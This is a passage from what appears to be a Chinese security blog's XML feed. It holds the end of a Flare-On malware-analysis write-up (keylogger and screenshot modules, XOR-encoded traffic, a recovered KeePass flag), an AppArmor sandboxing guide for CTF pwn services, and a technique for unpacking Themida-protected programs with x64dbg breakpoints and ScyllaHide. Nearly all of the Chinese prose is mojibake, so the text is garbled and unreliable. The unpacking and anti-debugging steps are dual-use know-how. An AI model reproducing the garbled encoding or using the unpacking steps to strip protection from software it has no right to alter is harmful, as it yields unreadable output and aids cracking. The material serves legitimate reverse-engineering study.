¹æ®è°ƒè¯•ä¿¡æ¯æ˜¯m.dllï¼Œè€Œä¸”å‘ç°å…¶è°ƒè¯•ä¿¡æ¯ä¸­çš„è·¯å¾„ä¸man.sysç±»ä¼¼ï¼Œæœäº†ä¸‹ï¼Œå†…å­˜é‡Œè¿˜åŠ è½½è¿‡c.dllã€n.dllã€k.dllã€s.dllã€f.dllã€driver1.sysã€‚ä¸è¿‡åé¢å‡ ä¸ªpeæ–‡ä»¶åªæœ‰peå¤´éƒ¨åŠå°é‡çš„ä»£ç ï¼Œå¤§éƒ¨åˆ†ä»£ç éƒ¨åˆ†ç¼ºå¤±ã€‚<br>æ ¹æ®è°ƒè¯•ä¿¡æ¯åŠç®€å•åˆ†æpeæ–‡ä»¶åŠŸèƒ½å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">drive1.sys   shellcode  \\??\FLSC</span><br><span class="line">man.sys id</span><br><span class="line">m.dll   cd   listen port 4444    \\.\FLID</span><br><span class="line">s.dll   screenshot</span><br><span class="line">n.dll   network</span><br><span class="line">f.dll   file</span><br><span class="line">c.dll   crypto</span><br><span class="line">k.dll   keylog</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹äº†ä¸‹æµé‡åŒ…ï¼Œç¡®å®šä¸»æ§ç«¯ipä¸º192.168.1.243ï¼Œvictim ipä¸º192.168.1.244ã€‚<br>å¼€å§‹å¯¹æ¯”åˆ†ææµé‡ï¼Œå‘ç°ç«¯å£4444,6666,7777,8888ä¸ºä¹‹é—´é€šè®¯ç«¯å£ã€‚4444ç«¯å£ä¸ºæ§åˆ¶æŒ‡ä»¤ç±»æ•°æ®ï¼Œå…¶å®ƒä¸‰ä¸ªç«¯å£ä¸ºvictimå‘å¤–ä¼ é€çš„æ•°æ®ã€‚ç½‘ç»œåŒ…ä¸­çš„æ•°æ®åŸºæœ¬éƒ½åŠ äº†ä¸€å±‚å¼‚æˆ–å¤„ç†ï¼Œå¯ä»¥ä»4444ç«¯å£çš„å¯¹æ¯”å‘ç°ï¼Œ6666åŠ8888ä¹‹é—´åŒä¸€æ•°æ®å‘ä¸¤æ¬¡ï¼Œä¸€æ¬¡åŠ äº†å¼‚æˆ–ï¼Œä¸€æ¬¡æ²¡åŠ ï¼Œ7777ç«¯å£æ•°æ®åŒ…è¾ƒå¤šï¼Œä¸­é—´å¤¹æ‚æ²¡åŠ å¼‚æˆ–çš„æ•°æ®åŒ…ã€‚</p><p>é€šè¿‡4444ç«¯å£ä¿¡æ¯å¾ˆç®€å•å°±èƒ½è§£äº†æœ€å¤–å±‚çš„å¼‚æˆ–ã€‚å‰4å­—èŠ‚æ˜¯æ•°æ®é•¿åº¦ï¼Œç„¶åæ˜¯4å­—èŠ‚çš„æŒ‡ä»¤ï¼Œå…¶å®ƒéƒ¨åˆ†åŠŸèƒ½æœªçŸ¥ï¼Œåº”è¯¥æ˜¯4å­—èŠ‚+4å­—èŠ‚+4å­—èŠ‚å­æ•°æ®é•¿åº¦+å­æ•°æ®+unknowçš„ç»“æ„ã€‚<br>æœ‰äº†å¤–å±‚æ•°æ®åŒ…çš„ç¼–ç æ–¹å¼ï¼Œ7777ç«¯å£çš„æ•°æ®å°±å¥½è§£äº†ï¼ŒåŸæ¥æ˜¯bmpå›¾ç‰‡æ•°æ®ï¼Œå»æ‰å…¶ä¸­çš„æœªç¼–ç çš„æ•°æ®ï¼Œå°†<code>\r\n</code>æ›¿æ¢æˆ<code>\n</code>ï¼Œç„¶åå°†æ•°æ®åŒ…åˆ†æˆå„æ–‡ä»¶ï¼Œæ ¹æ®å¼‚æˆ–å€¼ï¼Œå¡«å……ä¸‹ç¼ºå¤±çš„ä¸ªåˆ«å­—èŠ‚ï¼Œç„¶åè§£ç å»æ‰è¡¨ç¤ºé•¿åº¦çš„4å­—èŠ‚ï¼Œå›¾ç‰‡å°±è§£ç å¥½äº†ã€‚å›¾ç‰‡æ˜¯å±å¹•æˆªå›¾ï¼Œæœ‰äº›æ“ä½œå‘½ä»¤è¡Œçš„ï¼Œæœ‰äº›webæµè§ˆå™¨çš„ï¼Œæœ€ä¸»è¦æ˜¯æ‰“å¼€keepassçš„æ“ä½œï¼Œæœ€åçš„å›¾å¦‚ä¸‹ï¼š</p><p>åŠ å›¾<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190903010712.bmp" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190903010712.bmp"></a></p><p>æ ¹æ®å›¾ç‰‡å†…å®¹ï¼Œflagå°±åœ¨keepassçš„å¯†ç é¡¹ä¸­äº†ã€‚</p><p>åˆçœ‹äº†ä¸‹å…¶å®ƒçš„ç½‘ç»œåŒ…ï¼Œ4444ç«¯å£è¿˜å‘é€äº†ä¸ªæ–‡ä»¶å’Œkeepassçš„æ•°æ®åº“åï¼Œæ–‡ä»¶åº”è¯¥å°±æ˜¯ä¸Šé¢è¯´çš„driver1.sysï¼Œkeepassæ•°æ®åº“ååº”è¯¥æ˜¯æŸ¥æ‰¾æ–‡ä»¶è·¯å¾„ã€‚<br>6666ç«¯å£åº”è¯¥æ˜¯å‘é€keepassçš„æ•°æ®åº“æ–‡ä»¶ã€‚</p><p>å½“æ—¶åšé¢˜æ—¶æ¼äº†8888ç«¯å£ã€‚äºæ˜¯å¼€å§‹å¼€å§‹åœ¨dmpæ–‡ä»¶ä¸­æ‰¾keepassçš„ä¿¡æ¯ï¼Œæ‰¾åˆ°äº†æ•°æ®åº“æ–‡ä»¶å†…å®¹åŠåŠ å¯†è¿‡çš„masterkeyå’Œtransfer_masterkeyå’Œå¯¹åº”çš„sessoion_keyã€‚äºæ˜¯ä¹å°±æƒ³åŠæ³•è§£ç åŸå§‹keyï¼Œçœ‹äº†keepassçš„æºç ï¼Œæ‹¿åˆ°äº†å½“å‰ç”¨æˆ·çš„masterkeyï¼Œå¼€å§‹ç ”ç©¶DPAPIã€‚æœ€åå‘ç°keepassçš„å†…å­˜åŠ å¯†ç”¨äº†<code>CRYPTPROTECTMEMORY_SAME_PROCESS</code>æ ‡å¿—ï¼ŒåŠ å…¥äº†è¿›ç¨‹ä¿¡æ¯ï¼Œç„¶åå¹¶ä¸çŸ¥å‚ä¸åŠ å¯†çš„è¿›ç¨‹ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Œé™·å…¥åƒµå±€ã€‚</p><p>é‡æ–°ç†æ€è·¯ï¼Œæ„Ÿè§‰åº”è¯¥æ¼äº†ä»€ä¹ˆï¼Œé€šè¿‡<code>volatility</code>æŸ¥çœ‹ç½‘ç»œè¿æ¥æƒ…å†µï¼Œå‘ç°æ¼äº†8888ç«¯å£ã€‚æ­¤ç«¯å£ä¼ é€é”®ç›˜è®°å½•ä¿¡æ¯ï¼Œè§£äº†æœ€å¤–å±‚çš„å¼‚æˆ–ï¼Œå­æ•°æ®åŒ…å¹¶æœªèƒ½å®Œå…¨è§£ç ã€‚å­æ•°æ®åŒ…ç¼–ç æ–¹å¼ä¸6666ç«¯å£ä¸€è‡´ï¼Œé€šè¿‡keepassçš„æ•°æ®æ–‡ä»¶å†…å®¹ï¼Œå°è¯•å¼‚æˆ–è§£ç ï¼Œåªè§£ç éƒ¨åˆ†æ•°æ®ï¼Œä¼¼ä¹ç¼–ç åŠ å…¥äº†åé¦ˆæœºåˆ¶ã€‚8888ç«¯å£æœ€åä¼ é€çš„å°±æ˜¯keepassæ‰“å¼€æ•°æ®åº“æ—¶çš„é”®ç›˜è®°å½•ï¼Œä¼ é€çš„æ•°æ®ä¸­å¯ä»¥æ­£ç¡®è§£ç æ ‡é¢˜éƒ¨åˆ†<code>Open Database - keys.kdb</code>ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> flare-on </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨CTF Pwnä¸‹ä½¿ç”¨AppArmoråšæƒé™éš”ç¦»</title>
      <link href="AppArmor-Pwn-Env.html"/>
      <url>AppArmor-Pwn-Env.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æœ€è¿‘æ¥è§¦äº†ä¸‹AppArmorä»¥åŠåˆšå¥½æœ€è¿‘éƒ¨ç½²æŸæ¯”èµ›ï¼Œçªç„¶ä¸æƒ³ç”¨dockeråšæƒé™éš”ç¦»ï¼Œæ‰€ä»¥åšäº†ä¸ªè®°å½•</p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p><code>sudo apt-get install apparmor-profiles apparmor-utils</code></p><h3 id="åˆ›å»ºé…ç½®æ–‡ä»¶"><a href="#åˆ›å»ºé…ç½®æ–‡ä»¶" class="headerlink" title="åˆ›å»ºé…ç½®æ–‡ä»¶"></a>åˆ›å»ºé…ç½®æ–‡ä»¶</h3><p>åœ¨ç”Ÿæˆé…ç½®æ–‡ä»¶å‰ï¼Œéœ€è¦åšä¸ªè½¯è¿æ¥ï¼Œå› ä¸ºaa-autodepæ˜¯é€šè¿‡Pathå»å¯»æ‰¾ç›®æ ‡ç¨‹åºçš„ã€‚æ‰€ä»¥æˆ‘è¿™é‡Œå…ˆ</p><p><code>sudo ln -s /home/binfile /usr/local/bin/binfile</code></p><p>ç„¶å..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apparmor.d/</span><br><span class="line">sudo aa-autodep binfile</span><br></pre></td></tr></table></figure><p>æ­¤åˆ» /etc/apparmor.d ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€ä¸ª home.binfile çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug  6 18:49:37 2019</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;binfile flags&#x3D;(complain) &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  &#x2F;home&#x2F;binfile mr,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ‡æ¢ä¸º-Complain-æ¨¡å¼"><a href="#åˆ‡æ¢ä¸º-Complain-æ¨¡å¼" class="headerlink" title="åˆ‡æ¢ä¸º Complain æ¨¡å¼"></a>åˆ‡æ¢ä¸º Complain æ¨¡å¼</h3><p><code>sudo aa-complain home.binaryname</code></p><p>ç´§æ¥ç€æ­£å¸¸è¿è¡Œç¨‹åºä»¥åŠexploit</p><h3 id="é…ç½®è§„åˆ™"><a href="#é…ç½®è§„åˆ™" class="headerlink" title="é…ç½®è§„åˆ™"></a>é…ç½®è§„åˆ™</h3><p>ç”¨<code>sudo aa-logprof</code> ç”Ÿæˆè®°å½•è¿è¡Œè¿‡ç¨‹ä¸­çš„æ­£å¸¸æ—¥å¿—</p><p>ç”Ÿæˆçš„è§„åˆ™å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug  6 19:39:38 2019</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;hub flags&#x3D;(complain) &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  &#x2F;bin&#x2F;dash cx -&gt; &#x2F;bin&#x2F;dash,</span><br><span class="line">  &#x2F;bin&#x2F;dash mr,</span><br><span class="line">  &#x2F;home&#x2F;hub mr,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  profile &#x2F;bin&#x2F;dash flags&#x3D;(complain) &#123;</span><br><span class="line">    #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">    &#x2F;bin&#x2F;cat mrix,</span><br><span class="line">    &#x2F;bin&#x2F;dash mr,</span><br><span class="line">    &#x2F;bin&#x2F;ls mrix,</span><br><span class="line">    &#x2F;home&#x2F; r,</span><br><span class="line">    &#x2F;home&#x2F;* r,</span><br><span class="line">    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºè‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶å¹¶ä¸æ˜¯é‚£ä¹ˆå®Œç¾ï¼Œå› æ­¤æˆ‘ä»¬è¦æ‰‹åŠ¨ä¿®æ”¹ã€‚</p><ol><li>ç”±äºè¿œç¨‹éœ€è¦ï¼Œéœ€è¦åŠ ä¸Šnetwork inet stream</li><li>æˆ‘ä»…ä»…éœ€è¦è¯»å– flagï¼Œå› æ­¤éœ€è¦ä¿®æ”¹å¯è¯»æ–‡ä»¶ç›®å½•</li></ol><p>æœ€åä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;hub &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  network inet stream,</span><br><span class="line">&#x2F;bin&#x2F;dash mrix,</span><br><span class="line">  &#x2F;bin&#x2F;bash mrix,</span><br><span class="line">  &#x2F;bin&#x2F;cat mrix,</span><br><span class="line">  &#x2F;bin&#x2F;ls mrix,</span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;id mrix,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line">  &#x2F;tmp&#x2F;server mr,</span><br><span class="line">  &#x2F;tmp&#x2F; r,</span><br><span class="line">  &#x2F;tmp&#x2F;flag r,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ^&#x2F;bin&#x2F;bash &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å°†å®ƒå¯¼å…¥å†…æ ¸ä½¿ç”¨ï¼š</p><p><code>apparmor_parser -r /etc/apparmor.d/home.hub</code></p><p>æˆ–è€…</p><p><code>aa-enforce /etc/apparmor.d/home.hub</code></p><p>å…¶å®è¯´æ¥è¿™ä¸ªé…ç½®æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªç™½åå•ï¼Œæ„å‘³ç€å¦‚æœä¸€äº›å†…å®¹å¤šå†™è¿›åˆ°ç™½åå•é‡Œï¼Œå¯èƒ½ä¼šé€ æˆæƒé™é…ç½®ä¸å½“ã€‚</p><h2 id="ä¸xinetd-åˆç”¨"><a href="#ä¸xinetd-åˆç”¨" class="headerlink" title="ä¸xinetd åˆç”¨"></a>ä¸xinetd åˆç”¨</h2><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>ç”±äºç”¨æ¥é…ç½® ctf pwn,æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©xinetdï¼Œé…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">service pwn_server</span><br><span class="line">&#123;</span><br><span class="line">socket_type &#x3D; stream</span><br><span class="line">protocol &#x3D; tcp</span><br><span class="line">user &#x3D; root</span><br><span class="line">group &#x3D; root</span><br><span class="line">server &#x3D; &#x2F;home&#x2F;limit.sh</span><br><span class="line">wait &#x3D; no</span><br><span class="line">per_source &#x3D; 50</span><br><span class="line">banner &#x3D; &#x2F;home&#x2F;banner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>limit.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">ulimit -u 10000</span><br><span class="line">ulimit -c 0</span><br><span class="line">ulimit -v 7340032</span><br><span class="line">/home/hub</span><br></pre></td></tr></table></figure><p>å¹¶åœ¨ <strong>/etc/services</strong> åŠ ä¸Šç›¸åº”çš„æœåŠ¡åç§°ä¸ç«¯å£ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn_server      12435&#x2F;tcp</span><br><span class="line">tcpmux          1&#x2F;tcp                           # TCP port service multiplexer</span><br><span class="line">echo            7&#x2F;tcp</span><br><span class="line">echo            7&#x2F;udp</span><br></pre></td></tr></table></figure><p>æœ€å service xinetd start å¯åŠ¨å³å¯ã€‚ </p><p>å†²ï¼XD</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AppArmor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªè„± themida å¼ºå£³çš„ç‰¹æ®Šæ–¹æ³•</title>
      <link href="easy-way-to-unpacking-theminda2.x.html"/>
      <url>easy-way-to-unpacking-theminda2.x.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰æ®µæ—¶é—´ï¼Œå¹²ä¸€ä¸ªæ´»çš„æ—¶å€™é‡åˆ°äº†ä¸€ä¸ªå¼ºå£³ Themidaï¼Œç®€ç§° TMD å£³ã€‚æœäº†ä¸€ä¸‹èµ„æ–™</p><p>è¿™ä¸ªå£³çš„ç‰¹ç‚¹å°±æ˜¯ä¼šåœ¨å…³é”®ä»£ç å¤„é‡‡ç”¨ vmp ä¿æŠ¤ï¼Œå¦‚ vmp ä¿æŠ¤ç¨‹åºå…¥å£ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505001531.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505001531.png"></a></p><p>å¥½åœ¨æˆ‘é‡åˆ°çš„è¿™ä¸ªå£³æ²¡æœ‰å¯¹ oep è¿›è¡Œå¤„ç†ã€‚æ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒå¥½æ‰¾åˆ° oepçš„ã€‚</p><h1 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h1><p>è„±å£³è¿‡ç¨‹ä¸­æ‰¾ oep æ˜¯ä¸€ä¸ªå…³é”®çš„çš„æ­¥éª¤ï¼Œæ‰¾ oep æœ‰è®¸å¤šçš„æ–¹æ³•ï¼Œä½†æ˜¯å…¶å®å¤§éƒ½å¯¹ TMD è¿™ç§å¼ºå£³æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿï¼ˆå¯èƒ½æ˜¯æˆ‘è„±çš„å£³æ¯”è¾ƒå°‘ï¼‰ã€‚å¦å¤–è¿˜æœ‰ä¸€ç§å¸¸è§çš„æ–¹æ³•ï¼Œå°±æ˜¯æ‰¾å…³é”® api ç„¶åå›æº¯ï¼Œæ‰¾åˆ°çœŸæ­£çš„å…¥å£ï¼Œä¸‹ç¡¬ä»¶æ–­ç‚¹ã€‚</p><p>æˆ‘é‡åˆ°çš„è¿™ä¸ªç¨‹åºæ˜¯ msvcrt ç¼–å†™çš„ç¨‹åºã€‚</p><p>æˆ‘ä»¬çŸ¥é“åœ¨ MSVC ä¸­ç¨‹åºç¼–è¯‘å™¨ä¼šä¸ºå…¨å±€å’Œé™æ€å‡½æ•°ç”Ÿæˆç›¸åº”çš„åˆå§‹åŒ–å™¨ï¼Œå¹¶æŠŠä»–ä»¬çš„åœ°å€æ”¾åœ¨ä¸€ä¸ªè¡¨ï¼ˆtableï¼‰ä¸­ï¼Œè¿™ä¸ªè¡¨ä¼šåœ¨ _cinit() åˆå§‹åŒ– CRT çš„æ—¶å€™ç”Ÿæˆã€‚åœ¨ PE ç»“æ„ä¸­ï¼Œè¿™ä¸ªè¡¨é€šå¸¸åœ¨ .data æ®µçš„èµ·å§‹ä½ç½®ã€‚<br>ä» Entry Point åˆ° main å‡½æ•°è¿‡ç¨‹ä¸­ï¼Œåœ¨å®Œæˆäº†_setargv() ä»¥åŠ_setenvp() ä¹‹åï¼Œè¿›å…¥åˆ°_cinit å‡½æ•°ã€‚<br>_cinit å‡½æ•°å¾ˆçŸ­ï¼Œå¤§è‡´ä¸Šåˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š</p><ol><li><p>_fpmath() æˆ–è€… (*_FPinit)();</p></li><li><p>_initterm( __xi_a, __xi_z );</p></li><li><p>_initterm( __xc_a, __xc_z );</p></li></ol><p>ç¬¬ä¸€æ­¥ æ˜¯å¯é€‰çš„ï¼Œ_FPinit ä¸»è¦ç”¨æ¥åˆå§‹åŒ–æµ®ç‚¹è¿ç®—ã€‚åªæœ‰å½“ç”¨æˆ·å†™çš„ä»£ç ä¸­å‡ºç°äº†æµ®ç‚¹è¿ç®—ï¼Œ_FPinit æ‰ä¼šè¢«å®šä¹‰ã€‚<br>ç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥ æ˜¯åˆ†åˆ«å¯¹Cå’ŒC++ç¨‹åºåšåˆå§‹åŒ–ã€‚_initterm æ¥å—ä¸¤ä¸ªæŒ‡é’ˆä½œä¸ºå‚æ•°ï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆä¸­é—´çš„å†…å­˜åŒºåŸŸæ˜¯ä¸€å¼ å‡½æ•°æŒ‡é’ˆè¡¨ã€‚_initterm ä¼šä»ç¬¬ä¸€ä¸ªæŒ‡é’ˆå¼€å§‹ï¼Œæ…¢æ…¢å‘åå¯»æ‰¾ï¼Œç›´åˆ°ç¬¬äºŒä¸ªæŒ‡é’ˆç»“æŸï¼Œä¸­é—´å¦‚æœæ‰¾åˆ°äº†ä¸€å—å†…å­˜è¡¨ç¤ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåˆ™æ‰§è¡Œè¯¥å‡½æ•°ã€‚</p><p>å…³é”®çš„åœ°æ–¹å°±æ˜¯åœ¨ç¨‹åºéœ€ä¼šèµ°åˆ°  <code>msvcrt._initterm</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹è¿™ä¸ªä½ç½®ä¸‹æ¡ä»¶æ–­ç‚¹ã€‚</p><h2 id="æ–­ç‚¹"><a href="#æ–­ç‚¹" class="headerlink" title="æ–­ç‚¹"></a>æ–­ç‚¹</h2><p>é¦–å…ˆæ‰¾åˆ°è‡ªå·±è¦çš„å…³é”®æ¨¡å—ï¼Œæ‰¾åˆ°æ¨¡å—çš„åŒºæ®µåœ°å€ã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505002653.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505002653.png"></a></p><p>ç„¶åä¸‹å¥½ æ¡ä»¶æ–­ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp msvcrt._initterm</span><br><span class="line">bpcnd msvcrt._initterm, [esp]&lt; 0xd2d000+0x1000</span><br></pre></td></tr></table></figure><h2 id="å¯»æ‰¾-oep"><a href="#å¯»æ‰¾-oep" class="headerlink" title="å¯»æ‰¾ oep"></a>å¯»æ‰¾ oep</h2><p>æ‰§è¡Œï¼Œç¨‹åºåˆ°è¾¾æ–­ç‚¹ã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003110.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003110.png"></a></p><p>æ­¤æ—¶ç¨‹åºåˆ°è¾¾æ–­ç‚¹ï¼Œå‘ç°æ­¤æ—¶ç¨‹åºæ¥åˆ°äº† esp ç¬¦åˆæ¡ä»¶çš„ä½ç½®ã€‚ è€Œæ­¤æ—¶çš„ esp å­˜å‚¨çš„åœ°å€å°±æ˜¯ oep é™„è¿‘ï¼Œæˆ‘ä»¬åªéœ€æ¥åˆ° esp å­˜matyå‚¨åœ°å€é™„è¿‘ï¼Œå¾€ä¸Šå›æº¯å³å¯ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003232.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003232.png"></a></p><h1 id="é¢˜å¤–"><a href="#é¢˜å¤–" class="headerlink" title="é¢˜å¤–"></a>é¢˜å¤–</h1><p>åœ¨ç”¨x64dbg è„±å£³çš„è¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¼ºçƒˆçš„åè°ƒè¯•ï¼Œç„¶åæˆ‘å°è¯•ç”¨äº†<a href="https://github.com/x64dbg/ScyllaHide">ScyllaHide</a>è¿™ä¸ªæ’ä»¶è§£å†³äº†ã€‚</p><p>å¦å¤–æ„Ÿè°¢ pizza å¯¹æˆ‘çš„å¸®åŠ©ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> revrse </tag>
            
            <tag> unpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASan and ASan in CTF(0ctf babyaegis)</title>
      <link href="ASan-and-ASan-in-CTF(0ctf-babyaegis).html"/>
      <url>ASan-and-ASan-in-CTF(0ctf-babyaegis).html</url>
      
